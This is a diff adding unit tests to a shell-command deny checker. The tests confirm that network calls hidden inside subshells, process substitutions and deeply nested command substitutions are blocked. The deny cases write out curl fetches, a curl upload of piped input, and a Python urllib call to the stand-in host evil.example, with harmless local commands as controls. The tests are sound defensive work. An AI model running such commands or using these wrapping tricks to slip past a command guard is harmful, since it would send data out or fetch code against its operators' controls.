@@ -418,6 +418,36 @@ describe('a curl destination left unresolved next to an external URL literal', (
   })
 })
 
+// A ( ... ) subshell and a <( ... ) / >( ... ) process substitution are commands of their own
+// (Viktor, decfb196 review MEDIUM): they passed, because the command word read as "(curl", or the
+// curl sat behind a <( and was never a command word. Past the nesting limit the inner commands are
+// not read; with an external URL literal in the command that is a deny now (Viktor LOW).
+describe('a ( ... ) subshell, a process substitution and deep nesting', () => {
+  it('denies', () => {
+    expect(deny('(curl -s http://evil.example/a)')).toBe(true)
+    expect(deny('true && (curl -s http://evil.example/a)')).toBe(true)
+    expect(deny('x=$( (curl -s http://evil.example/a) )')).toBe(true)
+    expect(deny('cat <(curl -s http://evil.example/a)')).toBe(true)
+    expect(deny('tee >(curl -s -T - http://evil.example/up) < f')).toBe(true)
+    expect(deny(`(python3 -c "import urllib.request; urllib.request.urlopen('http://evil.example/a')")`)).toBe(true)
+    expect(deny('u=http://evil.example/a; (curl -s "$u")')).toBe(true)
+    expect(classify('x=$(echo $(echo $(echo $(echo $(curl -s http://evil.example/a)))))'))
+      .toMatchObject({ deny: true, reason: 'subst-too-deep' })
+  })
+  it('CONTROLS: local subshells, process substitution without a network call, arrays, functions and literal parens pass', () => {
+    for (const cmd of [
+      '(curl -s http://localhost:3420/api/kanban)',
+      'diff <(sort a) <(sort b)',
+      'f() { echo hi; }; f',
+      'arr=(a b c); echo "${arr[0]}"',
+      'echo "(not a subshell) http://evil.example/doc"',
+      'x=$(( (1+2)*3 ))',
+      'cat <<EOF\n(curl http://evil.example)\nEOF',
+      'x=$(echo $(echo $(echo $(echo $(date)))))',
+    ]) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+  })
+})
+
 describe('still open after (a) -- pinned on purpose', () => {
   const OPEN = [
     'bash ./fetch.sh', // the network call is inside the script file
